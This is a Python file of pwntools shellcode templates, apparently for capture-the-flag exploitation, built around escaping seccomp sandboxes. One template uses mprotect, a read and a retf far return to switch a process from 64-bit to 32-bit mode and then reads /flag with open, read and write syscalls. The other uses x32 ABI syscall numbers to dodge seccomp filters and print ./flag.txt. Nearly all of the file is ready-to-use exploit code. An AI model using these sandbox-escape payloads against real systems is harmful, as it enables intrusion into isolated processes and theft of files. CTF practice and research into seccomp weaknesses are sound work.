#coding:utf-8

'''
some payload templates for shellcode
'''

def ret2x86():
    """
    if seccomp rule don't check architecture, we can
    switch from 64-bit to 32-bit to bypass seccomp
    challenge: TW 2016 MMA diary
    wp: https://uaf.io/exploitation/2016/09/06/TokyoWesterns-MMA-Diary.html
    note that after switch to 32bit you should use open, read and write
    syscall to print the flag instead of execve("/bin/sh")
    """
    template = ("""MPROTECT_START = # bss is recommended
MPROTECT_LEN = 
SHELLCODE_ADDR = 
SHELLCODE_LEN = 0x100
p1 = asm(shellcraft.amd64.mprotect(MPROTECT_START, MPROTECT_LEN, 7), arch='amd64')+\\
asm(shellcraft.amd64.read(0, SHELLCODE_ADDR, SHELLCODE_LEN), arch='amd64') + \\
# return to x86
asm('''xor rsp, rsp
mov esp, 0x602400
mov DWORD PTR [esp+4], 0x23
mov DWORD PTR [esp], 0x602800
retf''', arch='amd64')
""")

    template += ("""context.bits = 32 # if context.bits=64, then use shellcraft to generate 32-bit
# shellcode will fail
BUF_ADDR = # buf to store flag
FLAG_LEN = 0x40
p2 = asm(shellcraft.i386.open("/flag", 0x80000, 0), arch='x86') # fopen("/flag", "r")
p2 += asm(shellcraft.i386.read('eax', BUF_ADDR, FLAG_LEN), arch='x86')
p2 += asm(shellcraft.i386.write(1, BUF_ADDR, FLAG_LEN), arch='x86')
""")

    return template

def x32abi_orw():
    """
    if seccomp don't filter syscall > 0x40000000, we can use
    x32abi to bypass seccomp
    #define __X32_SYSCALL_BIT 0x40000000
    #define __NR_read (__X32_SYSCALL_BIT + 0)
    #define __NR_write (__X32_SYSCALL_BIT + 1)
    #define __NR_open (__X32_SYSCALL_BIT + 2)
    """
    template = """sc = '''
    # open ./flag.txt, modify if necessary
    push 0x1010101 ^ 0x7478
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x742e67616c662f2e
    push rax
	mov rdi, rsp
	xor edx, edx /* 0 */
	xor esi, esi /* 0 */
	mov rax,0x40000002
	syscall

	mov rdi, rax
	sub rsp, 0x1000
	lea rsi, [rsp]
	mov rdx, 0x1000
	mov rax, 0x40000000
	syscall

	mov rdi, 1
	mov rdx, rax
	mov rax, 0x40000001
	syscall

	mov rax, 0x4000003c
	xor rdi, rdi
	syscall
    '''"""
    return template